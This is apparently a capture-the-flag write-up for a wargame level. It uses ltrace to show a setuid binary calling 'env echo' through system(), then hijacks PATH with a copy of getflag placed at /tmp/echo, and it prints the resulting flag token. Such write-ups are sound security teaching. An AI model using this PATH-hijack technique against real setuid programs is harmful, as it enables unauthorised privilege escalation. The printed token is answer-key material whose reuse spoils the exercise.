# Level03
## Description
The level 03 user has an executable **level03**, which user is `flag03`.

# Solution
- If `getflag` get executed by **level03** we will obtain our token.<br>
Use `ltrace` to know if this is possible.

```bash
ltrace ./level03 

__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x8048510, 0x8048580 <unfinished ...>
getegid()                                        = 2003
geteuid()                                        = 2003
setresgid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
setresuid(2003, 2003, 2003, 0xb7e5ee55, 0xb7fed280) = 0
system("/usr/bin/env echo Exploit me"Exploit me
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                           = 0
+++ exited (status 0) +++

```
- ./level03 use `echo`. We need to change the command `echo` use inside ./level03 in `getflag`.<br>
We copy `getflag` in `/tmp/echo` and add `/tmp` at the begining of `$PATH`.

```bash
cp /bin/getflag /tmp/echo 
PATH=/tmp:$PATH
./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```
- The `echo` called is the first found in the env variable `PATH` so this correspond to our copy of `getflag`.<br>We have found the flag.
